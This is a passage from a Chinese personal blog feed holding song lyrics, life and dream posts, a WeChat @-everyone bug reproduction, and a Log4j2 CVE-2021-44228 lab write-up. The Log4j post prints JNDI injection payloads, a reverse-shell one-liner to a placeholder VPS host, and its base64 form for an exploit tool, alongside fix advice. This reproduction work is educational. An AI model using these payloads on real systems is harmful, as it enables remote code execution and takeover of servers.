&lt;h3 id=&#34;许嵩&#34;&gt;许嵩&lt;/h3&gt;
&lt;h4 id=&#34;庐州月&#34;&gt;《庐州月》&lt;/h4&gt;




&lt;div&gt;&lt;iframe id=&#34;biliplayer&#34; src=&#34;https://xuoneyuan.github.io//player.bilibili.com/player.html?bvid=BV1Ys4y197BP&amp;page=1&#34; scrolling=&#34;no&#34; border=&#34;0&#34; frameborder=&#34;no&#34; framespacing=&#34;0&#34; allowfullscreen=&#34;true&#34; loading=&#34;lazy&#34; &gt; &lt;/iframe&gt;&lt;/div&gt;

&lt;style&gt;
    
    #biliplayer {
      width: 100%;
      height: 550px;
    }
    @media only screen and (min-device-width: 320px) and (max-device-width: 480px) {
      #biliplayer {
        width: 100%;
        height: 250px;
      }
    }
    &lt;/style&gt;
    


&lt;blockquote class=&#34;quote&#34;&gt;&lt;p&gt;月也摇晃 人也彷徨 乌篷里传来了一曲离殇&lt;/p&gt;
&lt;p&gt;家乡月光 深深烙在我心上 却流不出当年泪光&lt;/p&gt;
&lt;p&gt;太多的伤 难诉衷肠 叹一句当时只道是寻常&lt;/p&gt;
&lt;/blockquote&gt; 

&lt;h4 id=&#34;清明雨上&#34;&gt;《清明雨上》&lt;/h4&gt;




&lt;div&gt;&lt;iframe id=&#34;biliplayer&#34; src=&#34;https://xuoneyuan.github.io//player.bilibili.com/player.html?bvid=BV1jV4y1D7yt&amp;page=1&#34; scrolling=&#34;no&#34; border=&#34;0&#34; frameborder=&#34;no&#34; framespacing=&#34;0&#34; allowfullscreen=&#34;true&#34; loading=&#34;lazy&#34; &gt; &lt;/iframe&gt;&lt;/div&gt;

&lt;style&gt;
    
    #biliplayer {
      width: 100%;
      height: 550px;
    }
    @media only screen and (min-device-width: 320px) and (max-device-width: 480px) {
      #biliplayer {
        width: 100%;
        height: 250px;
      }
    }
    &lt;/style&gt;
    


&lt;blockquote class=&#34;quote-center&#34;&gt;&lt;p&gt;木雕流金 岁月涟漪 七年前封笔 因为我今生挥毫只为你&lt;/p&gt;
&lt;p&gt;雨打湿了眼眶 年年倚井盼归堂 最怕不觉泪已拆两行&lt;/p&gt;
&lt;p&gt;我在人间彷徨 寻不到你的天堂 东瓶西镜放 恨不能遗忘&lt;/p&gt;
&lt;/blockquote&gt; 



&lt;blockquote class=&#34;quote-center&#34;&gt;&lt;p&gt;远方有琴 愀然空灵 声声催天雨 涓涓心事说给自己听&lt;/p&gt;
&lt;p&gt;月影憧憧 烟火几重 烛花红 红尘旧梦 梦断都成空&lt;/p&gt;
&lt;/blockquote&gt; 

&lt;h4 id=&#34;如果当时&#34;&gt;《如果当时》&lt;/h4&gt;




&lt;div&gt;&lt;iframe id=&#34;biliplayer&#34; src=&#34;https://xuoneyuan.github.io//player.bilibili.com/player.html?bvid=BV1RN4y1N7HS&amp;page=1&#34; scrolling=&#34;no&#34; border=&#34;0&#34; frameborder=&#34;no&#34; framespacing=&#34;0&#34; allowfullscreen=&#34;true&#34; loading=&#34;lazy&#34; &gt; &lt;/iframe&gt;&lt;/div&gt;

&lt;style&gt;
    
    #biliplayer {
      width: 100%;
      height: 550px;
    }
    @media only screen and (min-device-width: 320px) and (max-device-width: 480px) {
      #biliplayer {
        width: 100%;
        height: 250px;
      }
    }
    &lt;/style&gt;
    


&lt;blockquote class=&#34;quote-center&#34;&gt;&lt;p&gt;天灰了 雨坠了&lt;/p&gt;
&lt;p&gt;视线要模糊了&lt;/p&gt;
&lt;p&gt;此时感觉到你的重要&lt;/p&gt;
&lt;p&gt;爱走了 心走了&lt;/p&gt;
&lt;p&gt;你说你要走了&lt;/p&gt;
&lt;p&gt;我为你唱最后的古谣&lt;/p&gt;
&lt;/blockquote&gt; 



&lt;blockquote class=&#34;quote-center&#34;&gt;&lt;p&gt;红雨瓢泼泛起了回忆怎么潜 你美目如当年 流转我心间&lt;/p&gt;
&lt;p&gt;渡口边最后一面洒下了句点 与你若只如初见 何须感伤离别&lt;/p&gt;
&lt;/blockquote&gt; 

</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/categories/%E9%9F%B3%E4%B9%90/">音乐</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/%E9%9F%B3%E4%B9%90/">音乐</category>
                                
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/bilibili/">bilibili</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>我不知道还能说什么了</title>
                <link>https://xuoneyuan.github.io/posts/7/</link>
                <guid isPermaLink="true">https://xuoneyuan.github.io/posts/7/</guid>
                <pubDate>Wed, 29 Nov 2023 14:46:32 &#43;0800</pubDate>
                
                    <author>xuoneyuan@gmail.com (falcone)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;p&gt;很遗憾，这篇文章不是技术类的，时隔十多天，再次发博客，没想到竟然还是抱怨生活的。哈哈。&lt;/p&gt;
&lt;p&gt;当然这不代表我陷入了停滞期，相反，就在几天前，我跑到操场上一边吹着冷风，一边思考着到底应该发些什么。我想过写go的通道，Java里关于Spring bean的生命周期，写redis和MySQL数据一致性的问题，或者分布式锁，分布式ID的生成方案，好像死锁也可以，噢，我还可以写ACID，写nginx，写netty，写RPC框架，写kubernetes。可是最后，我什么也没有写出来。我只是觉得，我还没有对这个东西形成一个完整的认识，没有深刻的理解，我所写的一切，都是停留在最表面的层面，都只能借鉴别人现成的写好的东西，我有什么高论？我有什么看法？没有！我只不过是站在巨人的肩膀上看问题罢了，我不想装作这一切功劳都是我获得的一样，还没等别人看不下去，我自己就先吐了。&lt;/p&gt;
&lt;p&gt;于是我什么也没写。于是在这个下午我不知道我要干什么。于是我在床上躺到两点多。&lt;/p&gt;
&lt;p&gt;学会前端？后端？深度学习？拜托，你连anaconda都还没安装呢！回归网络安全？看会渗透？或者密码学？come on,我才不想学该死的cryptography！说实话，我对这玩意一点兴趣都没有。但是偏偏，你电又特别擅长这个。算了，干脆去图书馆吧。WTF,耳机又没带，小事，什么，充电宝也没电了！好，这么玩是吧。Calm down,比起这些，前面的一对情侣秀恩爱更让我无语。那行吧，到了点我自己走可以吧。&lt;/p&gt;
&lt;p&gt;一切愤怒的导火索还要追寻到今天上午，我本来高高兴兴打开我的GPT3.8，这是我在网上找到一个国人团队制作的好用的大模型。他不如openAI官网的GPT4，但他比GPT3.5还是强多了。就在今天，他告诉我，由于部分薅羊毛用户的存在，本站的收费方式由包月制改成按照token收费。&lt;/p&gt;
&lt;p&gt;我的脑子嗡一下麻了。仔细想想，他说的那个重度使用的人好像就是我。毕竟按他的计费方式，换算下来我一天最少能用30块钱，但是实际上我一天只花了一块多不到两块钱。这种感觉，就像之前一直利用的漏洞突然被修复一样，这个少数人才知道的后门被彻彻底底的堵死了，虽然我肯定没亏，但是接下来我又该怎么办呢？&lt;/p&gt;
&lt;p&gt;听会儿G.E.M.的歌吧，下一首是霉霉的，嗯，感觉心情又好了一点。&lt;/p&gt;
&lt;p&gt;说回学校，今天又在催填写去向的收集表了。F**K，真是哪壶不开提哪壶，屋漏偏逢连夜雨啊。你是故意找茬是不是？开玩笑的。但是，对于未来，我却出现了一丝犹豫，我对之前坚定的就业打算做了动摇。我突然觉得，学校也挺好的，起码跟社会比起来，他要单纯多了，简单多了。当然我也知道我是不可能一辈子都呆在学校的，但是多待个两三年好像也不错，我还有很多想法，很多打算，如果我去打工了，这些恐怕都要变成泡影了。我害怕我进入社会之后我就再也没有时间也没有精力去做这些事了。Wait，前面的情侣怎么走了？我都还没走呢！不考研了？不要你们的大好未来了？给我回来！&lt;/p&gt;
&lt;p&gt;估计是我打字的声音太响了他们俩才走的吧。话说坐在我斜对面的哥们放本书在桌子上怎么现在都还没回来。看看时间，三点半了，去饮茶了？噢我忘了，可能他们两个人有课，啊，なるほど！天天考研考研的，这里是B区，考研在A区，果然魔怔的人是我啊。说回考研，考去哪里？反正不是本校。回家去？可以！我想想，武大中大厦大，这都是家门口的好大学啊。其实当年我的分数是超了中大数学系最少5分的，如果我敢报，或许我现在就在广州了吧。还有高中同学建议考虑考虑中科大软院，浙大软院的，说实话现在我的做题水平是真不行了，不是做题家了，400多分太特么难了！知难而退不丢人，光说不做是懦夫。&lt;/p&gt;
&lt;p&gt;重申一次，我下午的效率非常非常低！这种状态真的什么都不想学。这可能跟我没有睡午觉的习惯有关。现在，我还是不知道我应该干什么，你让我学会课内的东西吧，真没动力了，又保不了研，这些东西一时间又用不上。学会数学，英语？我已经离开高中两年多了！无论是兴趣还是方法还是知识储备都是无限趋近于0，全部都忘光了，还给老师了。&lt;/p&gt;
&lt;p&gt;还有一件让人心烦的事，就是我的两颗门牙往外凸越来越明显了，最近说话总觉得有些大舌头，跟女生说话都说不清了，最明显的例子就是，食堂阿姨竟然把我最常点的饭的名字都听错了！&lt;/p&gt;
&lt;p&gt;呃呃呃呃呃，下一次更新什么，下一次什么时候更新？我不知道。人类什么时候灭亡？宇宙什么时候爆炸？我们来自哪里？我们最后又将去往何方。。。&lt;/p&gt;
</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/categories/%E6%84%9F%E6%83%B3/">感想</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/%E5%AD%A6%E4%B9%A0/">学习</category>
                                
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/%E7%94%9F%E6%B4%BB/">生活</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>微信又一个漏洞，要被群聊疯狂@了</title>
                <link>https://xuoneyuan.github.io/posts/5/</link>
                <guid isPermaLink="true">https://xuoneyuan.github.io/posts/5/</guid>
                <pubDate>Wed, 15 Nov 2023 23:29:52 &#43;0800</pubDate>
                
                    <author>xuoneyuan@gmail.com (falcone)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;p&gt;昨天晚上洗完澡，坐下来刚打开B站，首页就给我推了一个视频，封面赫然写着“微信叒爆新漏洞”，马上吸引了我的注意。很快啊，啪一下我就点了进去，迅速看完了这个视频，看完后打开微信，摩拳擦掌跃跃欲试开始复现这个漏洞。&lt;/p&gt;
&lt;h3 id=&#34;前置任务&#34;&gt;前置任务&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;必须在pc端&lt;/li&gt;
&lt;li&gt;必须有一个群的群主或管理员权限，换言之你必须要真的能@所有人&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;终章&#34;&gt;终章&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;在有权限的群里@所有人，将其ctrl+c&lt;/li&gt;
&lt;li&gt;到测试群（随便哪个，是不是管理无所谓）ctrl+v，然后引用群里随便某个人，再随便写一些东西&lt;/li&gt;
&lt;li&gt;发送，然后群里的其他人都会被你提到，即使你不是这个群的群主或者管理&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/weixin1.png&#34; alt=&#34;weixin&#34; title=&#34;其实这个漏洞前几年就有人用插件实现了，最近流传的方法让大家不用插件也能实现&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;漏洞原理&#34;&gt;漏洞原理&lt;/h3&gt;
&lt;p&gt;正常情况下，我们@一名用户，前端会给后端发送一段参数：&lt;/p&gt;
&lt;p&gt;@ u s e r n a m e : w x i d _ ******* @ # - d i v i d e r ) #  @ *****&lt;/p&gt;
&lt;p&gt;而@all时发送的参数会变成：&lt;/p&gt;
&lt;p&gt;@ u s e r n a m e : n o t i f y @ a l l @ # - d i v i d e r ) #  @ 所有人&lt;/p&gt;
&lt;h3 id=&#34;思维发散&#34;&gt;思维发散&lt;/h3&gt;
&lt;h5 id=&#34;sql注入&#34;&gt;SQL注入&lt;/h5&gt;
&lt;p&gt;SQL注入的原理就是，后端并没有对前端传入的数据进行严格过滤，使用户输入当作代码来执行，从而让用户能够操纵数据库&lt;/p&gt;
&lt;p&gt;关于sqli，我分享一些视频如下&lt;/p&gt;




&lt;div&gt;&lt;iframe id=&#34;biliplayer&#34; src=&#34;https://xuoneyuan.github.io//player.bilibili.com/player.html?bvid=BV1ZR4y1Y745&amp;page=1&#34; scrolling=&#34;no&#34; border=&#34;0&#34; frameborder=&#34;no&#34; framespacing=&#34;0&#34; allowfullscreen=&#34;true&#34; loading=&#34;lazy&#34; &gt; &lt;/iframe&gt;&lt;/div&gt;

&lt;style&gt;
    
    #biliplayer {
      width: 100%;
      height: 550px;
    }
    @media only screen and (min-device-width: 320px) and (max-device-width: 480px) {
      #biliplayer {
        width: 100%;
        height: 250px;
      }
    }
    &lt;/style&gt;
    
&lt;p&gt;以下内容需掌握科学才能查看&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/lubenwei.png&#34; alt=&#34;weixin&#34; title=&#34;不会真有人想在b站试试sqli吧，不会吧不会吧&#34;&gt;&lt;/p&gt;
&lt;style&gt;
    .meta-media {
      position: relative;
      margin-bottom: 30px;
      display: flex;
      width: 100%;
      height: 0;
      padding-bottom: 75%;
    }
    .video {
      position: absolute;
      width: 100%;
      height: 100%;
      left: 0;
      top: 0;
    }
    &lt;/style&gt;
    &lt;div class=&#34;meta-media&#34;&gt;
    &lt;iframe src=&#34;https://www.youtube.com/embed/cx6Xs3F_1Uc&#34; frameborder=&#34;no&#34; scrolling=&#34;yes&#34; allowfullscreen=&#34;allowfullscreen&#34; high_quality=&#34;1&#34; framespacing=&#34;1&#34; class=&#34;video&#34; &gt;
    &lt;/iframe&gt;
    &lt;/div&gt;
&lt;h5 id=&#34;腾讯&#34;&gt;腾讯&lt;/h5&gt;
&lt;p&gt;其实腾讯的两大通讯产品QQ和微信安全性已经毋庸置疑了，尤其是移动端。举个例子，你的个人二维码在移动端的浏览器上是打不开的，它会一直提示正在前往QQ，但其实无论你怎么升级QQ它也不会跳转到QQ的，借助第三方也不行。不信的话，你在pc端和移动端分别点击我博客下方的QQ标识，弹出的结果是不一样的。对于字符串拼接的问题，我都能想到预编译和参数化查询这些解决方法，难道腾讯的工程师还想不到吗？至于微信支付破解版？嗯，还是好好学习吧~&lt;/p&gt;
&lt;!-- ##### 改编科学家笑话一则
falcone刚开游戏，室友便看着他笑，说道“你玩游戏又开挂了”，falcone不说话，打开3dm查，要一个ct，打开风灵月影。室友又高声说道“你账号一定又被检测出存在不合法数据了”，falcone睁大眼睛说“你怎么凭空污人清白”，“什么清白，我亲眼看见你被封号，直接踢出战局”，falcone涨红了脸，争辩道“小开不算开……单机游戏的事，能算开吗？”接着便是难懂的话，什么“提高游戏体验”，什么“开挂保身”之类，宿舍内外充满了快活的空气。--&gt;
</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/%E5%BE%AE%E4%BF%A1/">微信</category>
                                
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/security/">security</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>Apache Log4j2 远程代码执行漏洞(CVE-2021-44228)</title>
                <link>https://xuoneyuan.github.io/posts/4/</link>
                <guid isPermaLink="true">https://xuoneyuan.github.io/posts/4/</guid>
                <pubDate>Mon, 13 Nov 2023 23:05:58 &#43;0800</pubDate>
                
                    <author>xuoneyuan@gmail.com (falcone)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;p&gt;这篇文章是从老博客搬过来的，很经典的一个漏洞，暑假搞的，现在好久都没做过漏洞复现了&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;做这个漏洞复现的主要原因是因为在看微信公众号文章的时候看到了这么一张图，第一眼看的时候就没绷住，后来在空间看到一个福建来的信安天才少年发了说说就是这张图，感觉有点意思，就想着自己也来复现一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-13.png&#34; alt=&#34;每次看都绷不住&#34; title=&#34;学网络安全导致的&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里我翻译一下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ldap://：这表示URL使用LDAP协议进行通信&lt;/li&gt;
&lt;li&gt;chinaran404：这是LDAP服务器的主机名或IP地址&lt;/li&gt;
&lt;li&gt;/loveme：这是LDAP服务器内特定资源的路径，可能是一个目录、条目或其他对象&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这不禁让我想起了这张图（知乎看到的，侵删）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-15.png&#34; alt=&#34;真的是一个悲伤的故事&#34; title=&#34;这位兄弟到底经历了什么&#34;&gt;&lt;/p&gt;
&lt;p&gt;好了言归正传，我们来分析一下这个漏洞&lt;/p&gt;
&lt;h3 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h3&gt;
&lt;h4 id=&#34;log4j2是什么&#34;&gt;log4j2是什么&lt;/h4&gt;
&lt;p&gt;log4j2是apache下的java应用常见的开源日志库，是一个就Java的日志记录工具。在log4j框架的基础上进行了改进，并引入了丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息&lt;/p&gt;
&lt;h4 id=&#34;jndi是什么&#34;&gt;JNDI是什么&lt;/h4&gt;
&lt;p&gt;JNDI，全称为Java命名和目录接口（Java Naming and Directory Interface）,是SUN公司提供的一种标准的Java命名系统接口，允许从指定的远程服务器获取并加载对象。JNDI相当于一个用于映射的字典，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。JNDI注入攻击时常用的就是通过RMI和LDAP两种服务&lt;/p&gt;
&lt;h4 id=&#34;log4j2远程代码执行漏洞原理&#34;&gt;log4j2远程代码执行漏洞原理&lt;/h4&gt;
&lt;p&gt;log4j2框架下的lookup查询服务提供了{}字段解析功能，传进去的值会被直接解析。例如${java:version}会被替换为对应的java版本。这样如果不对lookup的出栈进行限制，就有可能让查询指向任何服务（可能是攻击者部署好的恶意代码）&lt;br&gt;
攻击者可以利用这一点进行JNDI注入，使得受害者请求远程服务来链接本地对象，在lookup的{}里面构造payload，调用JNDI服务（LDAP）向攻击者提前部署好的恶意站点获取恶意的.class对象，造成了远程代码执行（可反弹shell到指定服务器）&lt;/p&gt;
&lt;p&gt;示意图:
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-17.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;漏洞等级&#34;&gt;漏洞等级&lt;/h4&gt;
&lt;p&gt;高危&lt;br&gt;
官方 CVSS 评分 10.0&lt;/p&gt;
&lt;h4 id=&#34;影响版本&#34;&gt;影响版本&lt;/h4&gt;
&lt;p&gt;Apache Log4j2 2.x &amp;lt;= 2.14.1&lt;br&gt;
Apache Log4j2 2.15.0-rc1（补丁绕过）&lt;/p&gt;
&lt;h3 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h3&gt;
&lt;h4 id=&#34;环境搭建&#34;&gt;环境搭建&lt;/h4&gt;
&lt;p&gt;这里我使用的是vulhub，利用docker启动关闭环境&lt;br&gt;
没有vulhub的可以用这个靶场：&lt;a href=&#34;https://vulfocus.cn/#/dashboard&#34;&gt;vulfocus&lt;/a&gt;&lt;br&gt;
没有docker的先下载
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-1.png&#34; alt=&#34;1&#34;&gt;
vulhub的下载&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip
unzip vulhub-master.zip
cd vulhub-master
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后进入需要开启的漏洞路径&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd vulhub-master/xxx/xxx
docker-compose up -d
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-2.png&#34; alt=&#34;1&#34;&gt;
端口是8983，我们接下来访问http://192.168.xxx.xxx:8983/solr/#/
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-3.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;漏洞检测&#34;&gt;漏洞检测&lt;/h4&gt;
&lt;p&gt;官方POC(二选一）&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;${jndi:ldap://${sys:java.version}.xxx.dnslog.cn}
${jndi:rmi://${sys:java.version}.xxx.dnslog.cn}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;利用DnsLog平台检测dns回显，查看是否有漏洞存在，获取一个子域名
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-4.png&#34; alt=&#34;1&#34;&gt;
接着我们就可以对目标网站进行测试了，访问：http://192.168.xxx.xxx:8983/solr/admin/cores?${jndi:ldap://${sys:java.version}.xxxxxx.dnslog.cn }
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-5.png&#34; alt=&#34;1&#34;&gt;
返回，刷新后得到数据
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-6.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h4&gt;
&lt;p&gt;反弹shell的命令&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/vps_ip/6666 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接着进行编码，对命令进行base64加密即可
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-18.png&#34; alt=&#34;1&#34;&gt;
接下来利用现成的JNDI注入工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，项目地址：&lt;a href=&#34;https://github.com/welk1n/JNDI-Injection-Exploit&#34;&gt;JNDI-Injection-Exploit&lt;/a&gt;
（注意下载的时候要关掉一切防火墙和实时保护）&lt;/p&gt;
&lt;p&gt;最迟到这里你的kali攻击机就要启动了，执行命令&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &amp;#34;bash -c {echo, YmFzaCAtaSA+JiAvZGV2L3RjcC92cHNfaXAvNjY2NiAwPiYxCg==}|{base64,-d}|{bash,-i}&amp;#34; -A 192.168.xxx.xxx
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行后终端如图：
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-7.png&#34; alt=&#34;1&#34;&gt;
这里已经一键部署好了RMI和LDAP服务的站点，并给出了路径，我选择用ldap，JDK1.8的版本为ldap://192.168.xxx.xxx:1389/Exploit，JDK1.7的版本为：ldap://192.168.xxx.xxx:1389/Exploit 这两个版本任选一个都行
再打开一个终端开启nc
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-8.png&#34; alt=&#34;1&#34;&gt;
把工具生成的payload插入到action后面&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://192.168.xxx.xxx:8983/solr/admin/cores?action=${jndi:ldap://192.168.xxx.xxx:1389/xxxxxx}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-9.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;再次返回kali我们可以看到nc成功反弹shell，但是我这里有一个小问题，就是shell没有反弹回来，查了一下csdn的一个大佬说他也反弹不回来，换了一个靶场就好了，所以可能是vulhub这个靶场的问题，我试了好几个端口比如6969，8888都没有成功反弹shell，这个时候已经凌晨2：40了，于是我决定先睡觉（&lt;del&gt;没错我就是懒狗&lt;/del&gt;）&lt;/p&gt;
&lt;p&gt;反弹成功的回显是这样的&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-11.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;本来到这里就应该结束了，但是我还是发现一个问题，就是在JNDI注入工具上决定了你是黑客大佬还是脚本小子，如果只会用工具，那么小学生都能顺利完成这个漏洞复现（问题是我已经大学了），在JNDI脚本运行上我又出了问题&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-12.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;我尝试了一下网上的方法，说是maven打包出现了问题，我照他的方法重新配置了起步依赖，但是没有用，这个事情充分说明了不会编程的hacker就是个伪命题（你给我去学Java、golang）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-16.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;修复建议&#34;&gt;修复建议&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;设置log4j2.formatMsgNoLookups=True，相当于直接禁止lookup查询出栈，也就不可能请求到访问到远程的恶意站点&lt;/li&gt;
&lt;li&gt;对包含有&amp;quot;jndi:ldap://&amp;quot;、&amp;quot;jndi:rmi//&amp;quot;这样字符串的请求进行拦截，即拦截JNDI语句来防止JNDI注入&lt;/li&gt;
&lt;li&gt;对系统进行合理配置，禁止不必要的业务访问外网，配置网络防火墙,禁止系统主动外连网络等等&lt;/li&gt;
&lt;li&gt;升级log4j2组件到新的安全的版本&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;彩蛋&#34;&gt;彩蛋&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-14.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/apache/">apache</category>
                                
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/security/">security</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>时间静止</title>
                <link>https://xuoneyuan.github.io/posts/3/</link>
                <guid isPermaLink="true">https://xuoneyuan.github.io/posts/3/</guid>
                <pubDate>Fri, 10 Nov 2023 14:31:54 &#43;0800</pubDate>
                
                    <author>xuoneyuan@gmail.com (falcone)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;h4 id=&#34;bgm&#34;&gt;BGM&lt;/h4&gt;
&lt;iframe frameborder=&#34;no&#34; border=&#34;0&#34; marginwidth=&#34;0&#34; marginheight=&#34;0&#34; width=330 height=86 src=&#34;https://xuoneyuan.github.io//music.163.com/outchain/player?type=2&amp;id=1365898499&amp;auto=0&amp;height=66&#34;&gt;&lt;/iframe&gt;
&lt;hr&gt;
&lt;h4 id=&#34;content&#34;&gt;CONTENT&lt;/h4&gt;
&lt;p&gt;可能是因为昨天在感概时间过得太快，逝者如斯夫，要是我会时间静止就好了，听说四维生物多出来的那个坐标轴就是时间轴，我会时间静止也就意味我完成了维度进化233。今天早上就做了一个梦，我来到了一座魔法学院，学习的就是时间静止魔法。我本来毫无目的在学校里面乱逛的时候突然发现了一座城堡，哥特式建筑。在这座城堡的阳台，有一个合唱团正在演出，我站在城堡窗户的外檐（就是空调师傅装外机的位置），旁边还站着一排人，大家都在静静地听合唱团演奏，首先是一个儿童合唱团，童声非常清澈空灵，引得我旁边的两个女孩子赞叹不已（醒来时我发现完全不认识这两个女生）。然后又换了一个合唱团，这次是中央音乐学院的学生前来演奏。正当我在安静欣赏的时候我发现了两个高中同学，于是接下来我就跳到了地面上，随后左拐一路小跑进入了城堡内部，眼前是一片宽阔的长廊，没有怪物，没有敌人，我一下子反应过来我应该是走错了，于是我往回跑，进入了另一个大门。当我下楼梯时突然转角遇到爱，一个boss出现在我面前，我们两个马上交手，刚刚打了两个回合，我就醒来了。&lt;/p&gt;
&lt;p&gt;醒来以后后知后觉，因为那个敌人（四个字，具体叫什么忘了）身穿铠甲，手持一把画戟，而我是赤手空拳，论近战我肯定不是他的对手，顿时庆幸我及时醒了，要不然我哪里打得过他，必须得溜了。现在复盘下来这座城堡里长廊的原型应该是韦伯·维尔维特所在的学院（《君主·埃尔梅罗二世事件簿》的男主）和秀知院（《辉夜大小姐想让我告白》背景学校）的结合，进城堡前的外观原型是《艾尔登法环》里雷亚卢卡利亚魔法学院和王城罗德尔的结合，楼梯转角具体是哪里实在是无从考证，没有灯，只有一些火把来照亮视线，而且楼梯不是木质的是不锈钢做的，刷了一层暗红色油漆，踩在上面有清脆的噔噔噔金属撞击声，boss长得有一点像失乡骑士，但是更矮，铠甲是黄铜色的。&lt;/p&gt;
&lt;p&gt;后面又有一点失落，我的一切想象都是基于现实中已经存在的游戏、动漫、音乐形成的，还是没有脱离现实的桎梏，醒来后我还是一个地球人，不是三体人，没有水滴，在浩瀚无垠的宇宙中进行着不知道要去向何方的孤独流浪。&lt;/p&gt;
</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
